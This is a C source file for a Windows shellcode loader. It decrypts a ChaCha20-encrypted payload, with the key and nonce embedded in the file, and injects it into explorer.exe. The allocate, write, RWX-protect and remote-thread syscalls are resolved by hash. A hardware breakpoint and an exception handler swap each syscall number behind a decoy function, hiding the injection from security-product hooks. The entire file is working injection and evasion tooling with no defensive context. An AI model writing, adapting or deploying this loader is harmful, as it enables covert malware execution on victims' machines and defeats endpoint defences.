#include "Utils.h"
#include "Syscalls.h"
#include "ChaCha20.h"
#include <windows.h>
#include <stdio.h>

#ifdef _DEBUG
#define print_debug(...) printf(__VA_ARGS__)
#else
#define print_debug(...) do{} while(0)
#endif

#define ZwAllocateVirtualMemoryHash		0xD33D4AED
#define ZwWriteVirtualMemoryHash		0xC5D0A4C2
#define ZwProtectVirtualMemoryHash		0xBC3F4D89
#define ZwCreateThreadExHash			0xCD1DF775
#define ZwDrawText				0xA4926265

DWORD avmSSN;
DWORD wvmSSN;
DWORD pvmSSN;
DWORD cteSSN;

static PVOID pFakeFunctionAddr;
static PVOID pFakeFunctionAddrOffset;
static DWORD newSSN;

//https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
BYTE buf[] =
{
	"\x8C\x26\x7D\x35\xB9\x12\x95\x81\x11\x88\xE5\xAB\x79\xE2\xFC\xCA\x9B\xB3\x81\x3A\xF4\x42\xD4\x28\x1C\xB8\xE5\xFD\x77\xC2\xDA\x62\xBA\x41\x38"
	"\xE7\x3F\x52\xA6\x7A\xF3\x47\xF1\x58\x9D\xF4\xF6\x48\x1F\xA3\x8A\x94\x6D\x96\x4E\xD2\xBA\xA2\x5D\x24\xE7\x58\x38\xE3\x06\xD6\x2A\xB9\xD8\x24"
	"\xA7\xA0\xD0\xB9\x9C\x29\x44\xD8\xB7\x3C\xFD\x9E\x83\xF6\x37\xCE\xC3\x74\x57\xC7\xA2\xF6\xB4\x9E\x96\x78\x2A\xF4\x1F\xC2\x31\x1B\x29\xCF\x92"
	"\x1F\x22\x9B\x75\x05\xC8\x43\xBB\x62\x80\x31\x04\xB7\x4A\x54\x0F\xA5\x44\x4D\x38\x46\xD0\xB8\xF7\x3D\x4B\xDC\x4E\x26\x67\x3F\x12\x24\x6D\x55"
	"\x83\x3E\xA8\x87\x32\x02\x56\x61\xB2\x3D\x5D\x89\x77\xC3\x9D\x4A\x9B\x95\x5F\xAE\x8B\xA8\x47\xCE\x57\x04\x9D\x6B\x62\xD4\x7C\x51\xBA\x5D\x75"
	"\x39\xED\x7B\xDA\x0B\x76\x47\xDD\x71\xF1\x86\xC4\xF5\x40\x2C\x43\x5A\xB9\x10\xD5\xCF\x14\x9F\x5D\xEE\x17\x3C\x44\xE3\xF6\xBA\x79\xD1\x74\xDD"
	"\x56\x64\xFD\x33\xDB\x21\x73\xD3\xEA\x47\x08\x42\x07\x2A\x8D\xEC\x0E\x5B\x55\x37\xC7\xB9\x57\x6F\xCB\x51\x0E\x65\x61\xD2\x05\x2C\x05\xD7\xEE"
	"\xE9\xB2\x01\x41\x3C\xDB\x87\xC1\x20\x81\x8C\x6E\x52\xF3\x04\x10\x67\xC6\xC9\x51\x6E\xC4\xED\x4A\x20\x8B\xCE\x1F\x18\x0B\x74\xEF\xB0\x07\xE5"
	"\xD0\x1A\x15\x10\x9C\x60\xB8\xFB\xF5\x4A\x07\xEC\x57\x49\x5C\x22\x84\xB0\xB2\x24\x81\x87\x65\xE6\x8F\x28\xF6\x02\x1D\x50\xC4\xF6\xF4\x4C\x37"
	"\xC5\xAB\x1E\x9A\x80\xA2\x5F\x7E\xF0\xBE\xE9\xB4\xF2\x02\x5B\x35\x73\x6A\xD8\xE0\xC6\x0C\x29\xFC\x4F\x65\x5E\x0E\x54\x4F\xDD\x40\xC7\x07\x27"
	"\x45\xAE\x3A\xD3\x19\x16\x90\x78\x76\xE1\x20\x12\xF5\xD3\xB1\x60\xCD\xBA\x4E\x78\xA2\x5F\x34\x08\x01\xE7\x5E\x67\x1C\xFD\x34\xAD\x4A\x1D\xF5"
	"\x76\x08\x07\x9E\xAF\x8B\x76\x0F\x7B\xF3\x13\x06\x92\x81\xBF\x7B\xB9\x5D\x20\xCD\x1A\x3E\x3E\x31\x4D\x11\x27\x7F\xF0\xB6\xFD\xB4\x47\xED\x75"
	"\x1B\x64\xCC\x5E\xFB\xF4\x10\x47\x6C\x2D\x47\xE1\xAF"
};
BYTE k[] = { "\x50\x43\x74\x65\x77\x66\x6e\x51\x70\x4f\x47\x4c\x34\x78\x64\x57\x62\x52\x38\x55\x63\x37\x69\x64\x51\x52\x51\x61\x56\x53\x58\x41" };
BYTE n[] = { "\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xaa" };

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exceptions)
{
	if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
		exceptions->ExceptionRecord->ExceptionAddress == pFakeFunctionAddrOffset)
	{
		exceptions->ContextRecord->Rax = newSSN;
		ClearBreakpoint(exceptions->ContextRecord, 0);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else
		return EXCEPTION_CONTINUE_SEARCH;
}

static bool Init()
{
	if (!SW3_PopulateSyscallList())
		return FALSE;

	if ((avmSSN = SW3_GetSyscallNumber(ZwAllocateVirtualMemoryHash)) == -1)
		return FALSE;

	if ((wvmSSN = SW3_GetSyscallNumber(ZwWriteVirtualMemoryHash)) == -1)
		return FALSE;

	if ((pvmSSN = SW3_GetSyscallNumber(ZwProtectVirtualMemoryHash)) == -1)
		return FALSE;

	if ((cteSSN = SW3_GetSyscallNumber(ZwCreateThreadExHash)) == -1)
		return FALSE;

	if ((pFakeFunctionAddr = SW3_GetFunctionVAddress(ZwDrawText)) == NULL)
		return FALSE;

	pFakeFunctionAddrOffset = (PVOID)((BYTE*)pFakeFunctionAddr + 0x8);

	return TRUE;
}

int main()
{
	struct chacha20_context ctx;
	chacha20_init_context(&ctx, k, n, 0);

	HANDLE hProcess = NULL, hRemoteThread = NULL;
	PVOID pRemoteAddr = NULL;
	DWORD dwTgtProcId, oldProtect;
	SIZE_T bufLen = sizeof(buf), bytesWritten = 0;

	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_ALL;

	AddVectoredExceptionHandler(1, ExceptionHandler);

	if (!Init())
		return 0;

	dwTgtProcId = FindProcessByName(TEXT("explorer.exe"));
	if (dwTgtProcId == 0)
	{
		print_debug("[-] target process not found\n");
		return 0;
	}
	print_debug("[+] pid: %d\n", dwTgtProcId);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTgtProcId);
	if (hProcess == NULL)
	{
		print_debug("[-] handle not obtained\n");
		goto Exit;
	}
	print_debug("[+] handle obtained\n");

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = avmSSN;

		if (((NtAllocateVirtualMemory)pFakeFunctionAddr)(hProcess, &pRemoteAddr, 0, &bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != STATUS_SUCCESS)
		{
			print_debug("[-] NtAllocateVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = wvmSSN;

		chacha20_xor(&ctx, buf, sizeof(buf));

		if (((NtWriteVirtualMemory)pFakeFunctionAddr)(hProcess, pRemoteAddr, buf, sizeof(buf), NULL) != STATUS_SUCCESS)
		{
			print_debug("[-] NtWriteVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] written %lld bytes\n", bytesWritten);

		chacha20_xor(&ctx, buf, sizeof(buf));
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = pvmSSN;

		if (((NtProtectVirtualMemory)pFakeFunctionAddr)(hProcess, &pRemoteAddr, &bufLen, PAGE_EXECUTE_READWRITE, &oldProtect) != STATUS_SUCCESS)
		{
			print_debug("[-] NtProtectVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] virtual protect\n");
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = cteSSN;

		if (((NtCreateThreadEx)pFakeFunctionAddr)(&hRemoteThread, THREAD_ALL_ACCESS, NULL,
			hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS)
		{
			print_debug("[-] NtCreateThread failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		if (hRemoteThread == NULL)
		{
			print_debug("[-] handle on remote thread not obtained\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] remote thread created\n");
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

Exit:
	if (hRemoteThread != NULL) CloseHandle(hRemoteThread);
	if (hProcess != NULL) CloseHandle(hProcess);

	return 0;
}
